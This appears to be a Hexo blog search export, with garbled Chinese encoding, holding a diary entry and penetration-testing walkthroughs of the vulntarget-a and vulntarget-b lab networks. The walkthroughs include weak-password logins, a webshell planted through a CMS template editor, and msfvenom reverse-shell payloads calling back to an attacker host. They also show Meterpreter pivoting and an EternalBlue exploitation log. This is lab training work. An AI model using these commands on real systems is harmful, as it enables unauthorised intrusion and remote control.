<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>æ‚</title>
    <url>/posts/9577635b/</url>
    <content><![CDATA[<ul>
<li>2022.1.17</li>
</ul>
<p>9æœˆå¼€å§‹å°±ä¸€ç›´æ²¡åœ¨æ›´æ–°åšå®¢ï¼ŒåªæŠŠä¸€äº›å­¦ä¹ ç¬”è®°æ”¾åœ¨æœ¬åœ°äº†ã€‚æœ€è¿‘å¹´åº•äº†ï¼Œåœ¨å…¬å¸æ²¡(æ‘¸)äº‹ï¼ˆğŸŸï¼‰å¹²ï¼Œå°±æ€»ç»“ä¸‹åœ¨è¿™è¾¹å®ä¹ å­¦åˆ°çš„äº›ä¸œè¥¿ã€æœ¬æ¥æ‰“ç®—ç”¨wordpresså»æ­å»ºï¼Œæ­å¥½ä¹‹åå‘ç°å¤ªéº»çƒ¦äº†ï¼Œè¿˜æ˜¯hexoç®€å•ï¼Œè€Œä¸”ä¹‹å‰çš„ä¸œè¥¿ä¹Ÿä¸ç”¨è¿ç§»ã€‚ä¹‹å‰ä¸€ç›´æ‰˜ç®¡åˆ°githubä¸Šï¼Œä½†æ˜¯æœ‰äº›å›¾ç‰‡æ— æ³•æˆåŠŸè§£æå‡ºæ¥ï¼Œæ‰€ä»¥å°±å‡†å¤‡æ”¾åœ¨äº‘ä¸»æœºä¸Šï¼Œæœ€è¿‘è¿™å‡ å¤©å°±å¼€å§‹æŠŠæœ¬åœ°çš„ä¸€äº›ä¸œè¥¿æ•´ç†ä¸€ä¸‹æ”¾åˆ°åšå®¢ä¸Š..o(<em>ï¿£â–½ï¿£</em>)ãƒ–  å¾…å®Œæˆçš„ç­‰æœ‰æ—¶é—´å°±æ•´ç†ä¸Šå»</p>
<ul>
<li>2022.2.21</li>
</ul>
<p>è·ç¦»ä¸Šæ¬¡æ›´æ–°å·²ç»ä¸€ä¸ªå¤šæœˆäº†ï¼Œä¸­é—´éš”ç¦»äº†ä¸€å‘¨ï¼Œç„¶åå°±æ˜¯è¿‡å¹´å°±ä¸€ç›´æ‘†äº†â€¦è¿™æ®µæ—¶é—´åœ¨å­¦æ¶æ„æ ·æœ¬åˆ†æï¼Œåˆšçœ‹å®Œå¾®å°˜ç½‘ç»œçš„C++åæ±‡ç¼–ï¼Œä¸è¿‡åˆ°åé¢çš„windowsAPIé‚£å—åŸºæœ¬ä¸Šåªè·Ÿäº†è§†é¢‘ï¼Œæ²¡æœ‰è·Ÿç€æ•²ä»£ç ã€‚</p>
<p>è¿‘æœŸè®¡åˆ’å…ˆæŠŠä¹‹å‰æ²¡å®Œå–„å®Œçš„ä¸œè¥¿å†æ•´ç†ä¸‹ï¼Œé¡ºä¾¿å›é¡¾ä¸€ä¸‹ï¼Œç„¶åå†å‡†å¤‡æ˜¥æ‹›å’Œæ¯•è®¾äº†â€¦ç„¶åå†çœ‹ä¸€ä¸‹è¿™ä¸€ä¸¤ä¸ªæœˆçˆ†å‡ºçš„æ´ï¼Œç„¶åå†åœ¨å¾®æ­¥ä¸Šæ‰¾å‡ ä¸ªæ ·æœ¬åœ¨ç»ƒä¸‹æ‰‹ï¼ˆç”±äº4æœˆåˆè¦å›å­¦æ ¡å‘†ä¸€æ®µæ—¶é—´ï¼Œæ‰€ä»¥å°±æ²¡æ‰¾å®ä¹ ï¼Œä¸€ä¸ªå¤šæœˆçš„å®ä¹ ï¼Œï¼Œï¼Œæ—¶é—´ä¸Šæœ‰ç‚¹å°´å°¬â€¦ è®¡åˆ’å†æ¯•ä¸šæ­£å¼å·¥ä½œå‰å’Œæœ‹å‹å»ä¸€è¶Ÿæ—…è¡Œ~ï¼‰å¦‚æœæœ‰æ—¶é—´å°±å»å­¦ä¸€ä¸‹æ»´æ°´ä¸‰æœŸè¯¾ç¨‹QAQ  åŠ æ²¹å’¯ï¼ </p>
<ul>
<li>2022.3.5</li>
</ul>
<p>æœ€è¿‘å†å‡†å¤‡æ˜¥æ‹› åˆšç¬”è¯•äº†qax ã€‚åˆ·äº† 3ã€4 å¤©çš„ç‰›å®¢é¢˜ç›®ï¼Œç¼–ç¨‹é¢˜ä¸€é“ä¸ä¼š ç™½ç»™â€¦ é€‰æ‹©ä¸å®šé¡¹æ„Ÿè§‰è¿˜å¥½ï¼Œä¸è¿‡æƒ³éƒ½ä¸ç”¨æƒ³ å®šæ˜¯å‡‰å‡‰ã€‚è¯´å®è¯æˆ‘æŒºä¸å–œæ¬¢ç®—æ³•çš„ï¼Œä»å¤§å­¦ä»¥æ¥å°±å¯¹acmè¿™äº›ç®—æ³•ä¸æ„Ÿå…´è¶£ç„¶åé€‰æ‹©äº†æ‰“CTFï¼Œæ¥è§¦ç½‘ç»œå®‰å…¨çš„ï¼Œè®°ç€ä¹‹å‰ç§‹æ‹›çš„æ—¶å€™ä¹ŸæŠ•è¿‡å‡ å®¶ï¼ŒåŒæ ·éƒ½è¦è€ƒç®—æ³•QAQï¼Œç„¶åæ—¥å¸¸ç™½ç»™ï¼Œè¿™æ¬¡ä¹Ÿå¯„äº†ï¼ˆ æœ¬æ¥å°±æŒºèœçš„ï¼Œæˆ‘æ›´æƒ³å€¾å‘äºæŠŠæ—¶é—´å»å­¦ä¹ æ¼æ´å¤ç° å…æ€ æ ·æœ¬åˆ†æè¿™äº›ä¸œè¥¿ æˆ–è€…å»æœ‰æœºä¼šå»åˆ·ä¸€ä¸‹æ»´æ°´ï¼Œæ„Ÿè§‰å»åˆ·ç®—æ³•å¯¹æˆ‘ç›®å‰æ¥è¯´ çœŸçš„æ²¡å•¥æ„æ€ å°±ç®—æ˜¯åˆ·äº†å¥½å¤šé¢˜ æ„Ÿè§‰å¯¹æˆ‘åç»­ç½‘å®‰è·¯ä¸Šä¹Ÿæ²¡å•¥å¤ªå¤§ç”¨é€”â€¦ï¼‰ </p>
<p>åç»­å¯èƒ½è€ƒè™‘æ‰¾ä¸ªå®ä¹ å•¥çš„ï¼Œå¦‚æœæ—¶é—´ä¸Šå…è®¸çš„è¯ï¼Œä½†æ˜¯HvVä¼°è®¡æ—¶é—´ä¸Šå’Œæ¯•ä¸šå†²çª åˆå»ä¸æˆäº†.å»å¹´æœ¬èƒ½å»æˆï¼Œç»“æœå­¦é™¢åŸå› æ²¡æ³•å»ğŸ˜”</p>
<p>æ˜¥æ‹›éƒ½è€ƒç®—æ³• æˆ‘è¿˜æ˜¯æƒ³è€ƒè™‘èµ°ç¤¾æ‹›äº†(å¤ªèœäº†åˆ·ä¸åŠ¨ç®—æ³•ï¼Œè€Œä¸”æ¯«æ— å…´è¶£)ï¼Œè¿‘æœŸå°±å­¦ä¸‹æ ·æœ¬åˆ†æï¼Œå¤ç°ä¸‹æœ€è¿‘çˆ†å‡ºçš„å‡ ä¸ªæ´ï¼Œçœ‹çœ‹æ–‡ç« ï¼Œå­¦å­¦å…æ€ï¼Œå‡†å¤‡æ¯•ä¸šè®ºæ–‡äº†ã€‚</p>
<ul>
<li>2022.3.21</li>
</ul>
<p>è¿‘æœŸé™„è¿‘çˆ†å‘ç–«æƒ…äº†ï¼Œåˆšæ¥è¿™è¾¹åŠä¸ªæœˆè¿˜æœ‰å¥½å¤šåœ°æ–¹æ²¡å»æ‰“å¡ğŸ˜”ï¼Œå‘¨æœ«ä¸¤å¤©ä¹Ÿç®—æ˜¯ç›¸å¯¹å……å®å§ï¼Œæœ¬æƒ³å‡ºå»çˆ¬ä¸ªå±±ç»“æœæ™šä¸Šé£å¤ªå¤§äº†â€¦â€¦å°±å¾€è¿”äº†ã€‚å‘¨æœ«åœ¨å®¶åˆå®…äº†ä¸¤å¤©ï¼Œçœ‹çœ‹ä¹¦ï¼Œå­¦å­¦ä¹ ï¼Œæ‰“å‡ æŠŠdotaï¼Œç„¶åæ¯å¤©é”»ç‚¼ä¸€å°æ—¶ï¼Œåšåšç‘œä¼½ï¼Œå†å»åšå‡ é¡¿å‡è„‚é¤ï¼Œè™½ç„¶æœ‰ç‚¹æ— èŠï¼Œä½†æ˜¯è¿˜æ¯”è¾ƒå……å®ã€‚æœ€è¿‘ç”±äºä¸ªäººåŸå› ï¼Œä¹Ÿæ²¡å»åœ¨æ›´æ–°ä¸œè¥¿ã€‚å‘¨æœ«çœ‹äº†çœ‹whaleå¤§ä½¬çš„åšå®¢å’Œç›´æ’­ï¼Œæ„Ÿè§‰è¿˜æ˜¯æœ‰äº›æ„Ÿæ‚Ÿçš„ã€‚</p>
<p>å¹³æ—¥é‡Œè¿˜è¦å¤šå¤šé”»ç‚¼ï¼Œä¸€å¹´è‡³å°‘è¯»3æœ¬ä¹¦ï¼Œç»å¸¸é”»ç‚¼ã€ç‘œä¼½â€¦â€¦</p>
<p>è¿™åŠå¹´ç›®æ ‡çš„è¯å°±æ˜¯ </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">å‡åˆ°150ï¼Œ</span><br><span class="line"></span><br><span class="line">è¯»å®Œä¸€æœ¬ä¹¦å¹¶åŠæ—¶è®°å½•å¿ƒå¾—ï¼Œ</span><br><span class="line"></span><br><span class="line">æ‰“å®Œvulntargeté¶åœºï¼Œ</span><br><span class="line"></span><br><span class="line">æ¯å¤©åšæŒé”»ç‚¼(æ¯æ—¥æ—©æ™šç‘œä¼½ï¼Œæ™šä¸Šé”»ç‚¼)</span><br><span class="line"></span><br><span class="line">è°ƒå¥½ä½œæ¯</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å¦‚æœæœ‰æ—¶é—´çš„è¯ï¼Œå†æŠŠåšå®¢å¥½å¥½æ•´ç†ä¸€ä¸‹ï¼Œç„¶åè¿ç§»åˆ°æœåŠ¡å™¨ä¸Šï¼Œgithubä¸Šä¼šæœ‰ä¸€äº›å›¾ç‰‡æ— æ³•æˆåŠŸè§£æâ€¦</p>
]]></content>
  </entry>
  <entry>
    <title>vulntarget-bé¶æœº</title>
    <url>/posts/f33996e/</url>
    <content><![CDATA[<br>

<h3 id="æ‹“æ‰‘"><a href="#æ‹“æ‰‘" class="headerlink" title="æ‹“æ‰‘"></a>æ‹“æ‰‘</h3><br>

<p><img src="/posts/f33996e/1.png" alt="1.png"></p>
<br>

<br>

<h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><h4 id="å¤–ç½‘æœºå™¨-centos7"><a href="#å¤–ç½‘æœºå™¨-centos7" class="headerlink" title="å¤–ç½‘æœºå™¨ centos7"></a>å¤–ç½‘æœºå™¨ centos7</h4><p><code>vim /etc/sysconfig/network-scripts/ifcfg-ens33</code></p>
<p><img src="/posts/f33996e/2.png" alt="æˆªå›¾"></p>
<br>

<p><code>systemctl restart networl</code></p>
<p><code>ifconfig</code>   ipä¸º <code>10.10.10.134</code></p>
<br>

<br>

<br>

<h3 id="å¤–ç½‘æ‰“ç‚¹"><a href="#å¤–ç½‘æ‰“ç‚¹" class="headerlink" title="å¤–ç½‘æ‰“ç‚¹"></a>å¤–ç½‘æ‰“ç‚¹</h3><h4 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h4><p><code>nmap -sV 10.10.10.134</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~]</span><br><span class="line">â””â”€$ nmap 10.10.10.134 -sV</span><br><span class="line">Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-03-23 03:04 EDT</span><br><span class="line">Nmap scan report for 10.10.10.134</span><br><span class="line">Host is up (0.068s latency).</span><br><span class="line">Not shown: 993 closed tcp ports (conn-refused)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">21&#x2F;tcp   open  ftp     Pure-FTPd</span><br><span class="line">22&#x2F;tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">80&#x2F;tcp   open  http    nginx</span><br><span class="line">81&#x2F;tcp   open  http    nginx</span><br><span class="line">888&#x2F;tcp  open  http    nginx</span><br><span class="line">3306&#x2F;tcp open  mysql   MySQL (unauthorized)</span><br><span class="line">8888&#x2F;tcp open  http    nginx</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 11.54 seconds</span><br><span class="line">                                                                </span><br></pre></td></tr></table></figure>

<br>

<p>81ç«¯å£ æè‡´CMS</p>
<p>8888ç«¯å£ å®å¡”</p>
<p>80ç«¯å£ å°±ä¸€ä¸ªä¸»é¡µ dirsearchæ²¡æ‰«åˆ°ä¸œè¥¿</p>
<p>888ç«¯å£ 403</p>
<br>

<h4 id="ç›®å½•æ‰«æ"><a href="#ç›®å½•æ‰«æ" class="headerlink" title="ç›®å½•æ‰«æ"></a>ç›®å½•æ‰«æ</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Target: http:&#x2F;&#x2F;10.10.10.134:81&#x2F;</span><br><span class="line"></span><br><span class="line">[03:10:56] Starting:                                                         </span><br><span class="line">[03:11:04] 200 -  479B  - &#x2F;404.html                                         </span><br><span class="line">[03:11:04] 301 -  162B  - &#x2F;A  -&gt;  http:&#x2F;&#x2F;10.10.10.134:81&#x2F;A&#x2F;                 </span><br><span class="line">[03:11:06] 403 -  548B  - &#x2F;Public&#x2F;                                          </span><br><span class="line">[03:11:12] 302 -    0B  - &#x2F;admin.php  -&gt;  http:&#x2F;&#x2F;10.10.10.134:81&#x2F;admin.php&#x2F;Login&#x2F;index.html</span><br><span class="line">[03:11:22] 301 -  162B  - &#x2F;backup  -&gt;  http:&#x2F;&#x2F;10.10.10.134:81&#x2F;backup&#x2F;       </span><br><span class="line">[03:11:22] 403 -  548B  - &#x2F;backup&#x2F;                                          </span><br><span class="line">[03:11:24] 403 -  548B  - &#x2F;cache&#x2F;                                           </span><br><span class="line">[03:11:24] 301 -  162B  - &#x2F;cache  -&gt;  http:&#x2F;&#x2F;10.10.10.134:81&#x2F;cache&#x2F;</span><br><span class="line">[03:11:32] 200 -    4KB - &#x2F;favicon.ico                                      </span><br><span class="line">[03:11:36] 200 -  917B  - &#x2F;index.html                                       </span><br><span class="line">[03:11:37] 200 -    0B  - &#x2F;index.php&#x2F;login&#x2F;                                 </span><br><span class="line">[03:11:37] 200 -   14KB - &#x2F;index.php                                        </span><br><span class="line">[03:11:37] 301 -  162B  - &#x2F;install  -&gt;  http:&#x2F;&#x2F;10.10.10.134:81&#x2F;install&#x2F;     </span><br><span class="line">[03:11:37] 200 -   75B  - &#x2F;install&#x2F;index.php?upgrade&#x2F;                       </span><br><span class="line">[03:11:37] 200 -   75B  - &#x2F;install&#x2F;</span><br><span class="line">[03:11:51] 200 -   22KB - &#x2F;readme.txt                                       </span><br><span class="line">[03:11:51] 200 -  157B  - &#x2F;robots.txt                                       </span><br><span class="line">[03:11:55] 200 -  490B  - &#x2F;sitemap.xml                                      </span><br><span class="line">[03:11:57] 301 -  162B  - &#x2F;static  -&gt;  http:&#x2F;&#x2F;10.10.10.134:81&#x2F;static&#x2F;       </span><br><span class="line">[03:12:02] 200 -  816B  - &#x2F;web.config                                       </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ‰¾åˆ°åå°ç™»å½•ç‚¹ <code>admin.php</code> å¥½åƒé™¤äº†è¿™ä¸ª åˆ«çš„é¡µé¢éƒ½è®¿é—®ä¸äº†â€¦</p>
<p>å¼±å£ä»¤è¿›å…¥åå°â€¦ ï¼ˆåæ­£æˆ‘æ²¡è¯•å‡ºäº†/// ï¼‰ admin/admin123</p>
<p><img src="/posts/f33996e/3.png" alt="æˆªå›¾"></p>
<p>å‘ç°å½“å‰ç‰ˆæœ¬ä¸º v1.8.1 é€šè¿‡wapplyzerçœ‹åˆ°æ˜¯ nginx</p>
<br>

<h4 id="æ–‡ä»¶ä¸Šä¼ -å¤±è´¥"><a href="#æ–‡ä»¶ä¸Šä¼ -å¤±è´¥" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ (å¤±è´¥)"></a>æ–‡ä»¶ä¸Šä¼ (å¤±è´¥)</h4><p>åœ¨ç³»ç»Ÿè®¾ç½®-&gt;åŸºæœ¬è®¾ç½®-&gt;å…è®¸ä¸Šä¼ æ–‡ä»¶ç±»å‹  æ·»åŠ  phpåç¼€  ç„¶åå†å»æ‰¾ä¸€ä¸ªä¸Šä¼ ç‚¹</p>
<p>åœ¨ç½‘ç«™ç®¡ç†å¤„â€“&gt;è½®æ’­å›¾åˆ—è¡¨</p>
<p>å•†å“ç®¡ç†â€“&gt;å•†å“åˆ—è¡¨ </p>
<p><img src="/posts/f33996e/4.png" alt="æˆªå›¾"></p>
<p>ç„¶åæç¤ºä¸å…è®¸ä¸Šä¼  ï¼Œç”¨00æˆªæ–­è¿™ç±»çš„ éƒ½è¢«é‡å‘½åäº† æœ€ç»ˆè¿˜æ˜¯æ²¡ç»•è¿‡å»</p>
<p>å»ç½‘ä¸Šæ‰¾äº†ä¸‹æè‡´CMS1.8.1ç‰ˆæœ¬ç›¸å…³æ¼æ´ çœ‹åˆ°äº†è¿™ä¹ˆç¯‡æ–‡ç«  <a href="https://xz.aliyun.com/t/9359">https://xz.aliyun.com/t/9359</a></p>
<p>ä½¿ç”¨æ‹“å±•ç®¡ç†æ’ä»¶getshell</p>
<h4 id><a href="#" class="headerlink" title></a></h4><p><img src="/posts/f33996e/5.png" alt="æˆªå›¾"></p>
<p>ç„¶åä½¿ç”¨è¿™ä¸ªåœ¨çº¿ç¼–è¾‘æ¨¡æ¿</p>
<p><img src="/posts/f33996e/6.png" alt="æˆªå›¾"></p>
<p>ç„¶åè®¾ç½®ä¸€ä¸ªå¯†ç  è¿™é‡Œè®¾ç½®ä¸º 123321 æäº¤åè¿›å…¥äº†ä»£ç ç¼–è¾‘å™¨</p>
<p><img src="/posts/f33996e/7.png" alt="æˆªå›¾"></p>
<p>ç„¶åå°±å¯ä»¥é€šè¿‡è¿™ä¸ªç¼–è¾‘å™¨å»æŸ¥çœ‹ä»£ç  å†™å…¥ä¸€å¥è¯</p>
<p>åœ¨index.phpå†™ä¸€ä¸ªphpinfo ç„¶åæˆåŠŸç”Ÿæ•ˆ</p>
<p><img src="/posts/f33996e/8.png" alt="æˆªå›¾"></p>
<p><img src="/posts/f33996e/9.png" alt="æˆªå›¾"></p>
<p>è¿™æ ·å†™ä¸€ä¸ªä¸€å¥è¯ ç”¨èšå‰‘è¿ä¸€ä¸‹å°±å¯ä»¥äº†</p>
<p><img src="/posts/f33996e/10.png" alt="æˆªå›¾"></p>
<p>è¿ä¸Šèšå‰‘ä¹‹åæ²¡æ³•æ‰§è¡Œå‘½ä»¤ï¼Œçœ‹äº†ä¸‹phpinfo ç¦ç”¨äº†å¥½å¤šå‡½æ•° ä¹‹å‰æ‰«ç«¯å£çš„æ—¶å€™æ‰«åˆ°äº†æœ‰å®å¡”ï¼Œåº”è¯¥æ˜¯å®å¡”æŠŠå‡½æ•°ç»™ç¦æ‰äº†</p>
<p><img src="/posts/f33996e/11.png" alt="æˆªå›¾"></p>
<br>

<p>å°è¯•ä¸‹èšå‰‘ç»•è¿‡disable_functionçš„æ’ä»¶</p>
<p>ä½¿ç”¨è¿™ä¸ª<code>php7_GC_UAF</code> å¯ä»¥æˆåŠŸç»•è¿‡</p>
<p><img src="/posts/f33996e/12.png" alt="æˆªå›¾"></p>
<p>ç›´æ¥ä¸Šmsf</p>
<p><code>msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=10.10.10.114 lport=3344 -f elf &gt; 3344.elf</code></p>
<p><img src="/posts/f33996e/13.png" alt="æˆªå›¾"></p>
<br>

<p>å‘ç°æœ‰ä¸¤ä¸ªç½‘å¡ï¼Œä¸€ä¸ªç½‘æ®µä¸º<code>10.10.10.0/24</code> (å…¬ç½‘ipä¸º 10.10.10.134)</p>
<p>å¦ä¸€ä¸ªä¸º <code>10.0.20.0/24</code> (å†…ç½‘ipä¸º10.0.20.30)</p>
<h4 id="æ·»åŠ è·¯ç”±"><a href="#æ·»åŠ è·¯ç”±" class="headerlink" title="æ·»åŠ è·¯ç”±"></a>æ·»åŠ è·¯ç”±</h4><p><code>meterpreter &gt;  run post/multi/manage/autoroute</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[!] SESSION may not be compatible with this module (incompatible session platform: linux)                                                                 </span><br><span class="line">[*] Running module against localhost.localdomain                             </span><br><span class="line">[*] Searching for subnets to autoroute.                                      </span><br><span class="line">[+] Route added to subnet 10.0.20.0&#x2F;255.255.255.0 from host&#39;s routing table. </span><br><span class="line">[+] Route added to subnet 10.10.10.0&#x2F;255.255.255.0 from host&#39;s routing table.</span><br></pre></td></tr></table></figure>

<h4 id="ç«¯å£æ‰«æ-1"><a href="#ç«¯å£æ‰«æ-1" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h4><p><img src="/posts/f33996e/14.png" alt="æˆªå›¾">         </p>
<p>(æ‰«äº†å¥½ä¹…æ²¡æ‰«åˆ°ï¼Œçªç„¶æƒ³åˆ°æœºå™¨å¿˜è®°å¼€äº†â€¦ç¦»è°±)</p>
<p>ç›´æ¥æŒ‚ä»£ç† ç”¨proxychainsæ‰«</p>
<p><img src="/posts/f33996e/15.png" alt="æˆªå›¾"></p>
<p>åˆšæ‰ç”¨msfçš„portscanåªæ‰«åˆ°8080ï¼Œç”¨nmapæ‰«ä¸€ä¸‹</p>
<p><code>proxychains nmap -sV 10.0.20.66</code> æ‰«äº†20åˆ†é’Ÿ</p>
<p><img src="/posts/f33996e/16.png" alt="æˆªå›¾"></p>
<p>åˆå‘ç°äº†3306ç«¯å£</p>
<br>

<p>ç„¶åä½¿ç”¨æµè§ˆå™¨æŒ‚ä»£ç†è®¿é—® 10.0.20.66:8080 æ˜¯ä¸ªç¦…é“cms</p>
<p><img src="/posts/f33996e/17.png" alt="æˆªå›¾"></p>
<p>æŸ¥çœ‹æºç  å‘ç°æ˜¯ ç¦…é“v12.4.2 æ‰¾ä¸‹å¯¹åº”æ¼æ´</p>
<p>ä¸‹ç­äº† æ—©ç‚¹å›å» æ˜å¤©å†æâ€¦</p>
<br>

<br>

<br>

<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p><a href="https://n0puple.github.io/2021/07/06/%E6%9E%81%E8%87%B4cms1-7-%E5%90%8E%E5%8F%B0%E4%B8%A4%E5%A4%84getshell/">https://n0puple.github.io/2021/07/06/%E6%9E%81%E8%87%B4cms1-7-%E5%90%8E%E5%8F%B0%E4%B8%A4%E5%A4%84getshell/</a></p>
]]></content>
  </entry>
  <entry>
    <title>vulntarget-aé¶æœº</title>
    <url>/posts/3edb83f3/</url>
    <content><![CDATA[<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><blockquote>
<p><a href="https://mp.weixin.qq.com/s/uxwbnVOxkR8OBkkY9WW6aQ">https://mp.weixin.qq.com/s/uxwbnVOxkR8OBkkY9WW6aQ</a><br><a href="https://www.cnnews.today/showArticle?main_id=b3613271ffe35b6fd924822459c9ef36&amp;language=cht">https://www.cnnews.today/showArticle?main_id=b3613271ffe35b6fd924822459c9ef36&amp;language=cht</a></p>
</blockquote>
<h3 id="æ‹“æ‰‘å›¾"><a href="#æ‹“æ‰‘å›¾" class="headerlink" title="æ‹“æ‰‘å›¾"></a>æ‹“æ‰‘å›¾</h3><p><img src="/posts/3edb83f3/1.png"></p>
<p>ï¼ˆç›´æ¥åœ¨crowé‚£ä¸ªæ‹¿è¿‡æ¥çš„ï¼‰</p>
<h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><h4 id="åŸŸæ§-2019"><a href="#åŸŸæ§-2019" class="headerlink" title="åŸŸæ§ 2019"></a>åŸŸæ§ 2019</h4><p>administrator / Admin@666</p>
<p>IP 10.0.10.110</p>
<h4 id="å¤–ç½‘æœºå™¨-win7"><a href="#å¤–ç½‘æœºå™¨-win7" class="headerlink" title="å¤–ç½‘æœºå™¨ win7"></a>å¤–ç½‘æœºå™¨ win7</h4><p>win7 / admin</p>
<p>IP 192.168.0.133 / 10.0.20.98</p>
<h4 id="åŸŸå†…ç”¨æˆ·-2016"><a href="#åŸŸå†…ç”¨æˆ·-2016" class="headerlink" title="åŸŸå†…ç”¨æˆ· 2016"></a>åŸŸå†…ç”¨æˆ· 2016</h4><p>Administrator / Admin@123</p>
<p>balsec.com\win2016 / Admin#123</p>
<p>IP 10.0.10.111 / 10.0.20.99</p>
<br>

<h3 id="å¤–ç½‘æ‰“ç‚¹"><a href="#å¤–ç½‘æ‰“ç‚¹" class="headerlink" title="å¤–ç½‘æ‰“ç‚¹"></a>å¤–ç½‘æ‰“ç‚¹</h3><p>å¤–ç½‘æœºå™¨æ˜¯ä¸€å°win7 å·²çŸ¥IPä¸º 10.10.10.248</p>
<h4 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h4><p>å…ˆç”¨nmapæ‰«ä¸€ä¸‹ å‘ç°å°±ä¸€ä¸ª80 webç«¯å£</p>
<p><img src="/posts/3edb83f3/2.png" alt="æˆªå›¾"></p>
<h4 id="é€šè¾¾OA-Getshell"><a href="#é€šè¾¾OA-Getshell" class="headerlink" title="é€šè¾¾OA Getshell"></a>é€šè¾¾OA Getshell</h4><p>10.10.10.248 ä¸»é¡µæ˜¯ä¸€å°é€šè¾¾OA ç›´æ¥ä½¿ç”¨å·¥å…·æ¢­å“ˆ</p>
<p><img src="/posts/3edb83f3/3.png" alt="æˆªå›¾"></p>
<p>è¿æ¥èšå‰‘</p>
<p>æ‰§è¡Œ<code>whoami</code> ç›´æ¥æ˜¯systemæƒé™</p>
<p><img src="/posts/3edb83f3/4.png" alt="æˆªå›¾"></p>
<p>ç„¶å <code>systeminfo</code> <code>ipconfig /all</code></p>
<p>å‘ç°æœ‰ä¸¤å¼ ç½‘å¡ ä¸åœ¨åŸŸå†…</p>
<p><img src="/posts/3edb83f3/5.png" alt="æˆªå›¾"></p>
<br>

<p>è¿™é‡Œç›´æ¥ä¸ŠCS</p>
<p>æœ¬æƒ³ç›´æ¥ä»cs è½¬åˆ°msfï¼Œä¸€ç›´è¿ä¸ä¸Šæ¢payloadä¹Ÿä¸è¡Œï¼Œå°±ç›´æ¥ä¸Šä¸ªmsfé©¬</p>
<p><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.10.114 lport=8888 -f exe &gt; shell.exe</code></p>
<br>

<h4 id="ms17-010åˆ©ç”¨"><a href="#ms17-010åˆ©ç”¨" class="headerlink" title="ms17-010åˆ©ç”¨"></a>ms17-010åˆ©ç”¨</h4><p>è¿™é‡Œçš„win7ä¹Ÿå­˜åœ¨ms17010æ¼æ´ æˆåŠŸæ‹¿åˆ°</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">msf6 auxiliary(server&#x2F;socks_proxy) &gt; use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010 </span><br><span class="line">sf6 auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; set rhosts 10.10.10.248</span><br><span class="line">rhosts &#x3D;&gt; 10.10.10.248</span><br><span class="line">msf6 auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; exploit </span><br><span class="line"></span><br><span class="line">[+] 10.10.10.248:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 10.10.10.248:445      - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue </span><br><span class="line">msf6 exploit(windows&#x2F;smb&#x2F;ms17_010_eternalblue) &gt; set rhosts 10.10.10.248</span><br><span class="line">rhosts &#x3D;&gt; 10.10.10.248</span><br><span class="line">msf6 exploit(windows&#x2F;smb&#x2F;ms17_010_eternalblue) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.10.114:4444 </span><br><span class="line">[*] 10.10.10.248:445 - Using auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010 as check</span><br><span class="line">[+] 10.10.10.248:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 10.10.10.248:445      - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[+] 10.10.10.248:445 - The target is vulnerable.</span><br><span class="line">[*] 10.10.10.248:445 - Connecting to target for exploitation.</span><br><span class="line">[+] 10.10.10.248:445 - Connection established for exploitation.</span><br><span class="line">[+] 10.10.10.248:445 - Target OS selected valid for OS indicated by SMB reply</span><br><span class="line">[*] 10.10.10.248:445 - CORE raw buffer dump (42 bytes)</span><br><span class="line">[*] 10.10.10.248:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes</span><br><span class="line">[*] 10.10.10.248:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv</span><br><span class="line">[*] 10.10.10.248:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      </span><br><span class="line">[+] 10.10.10.248:445 - Target arch selected valid for 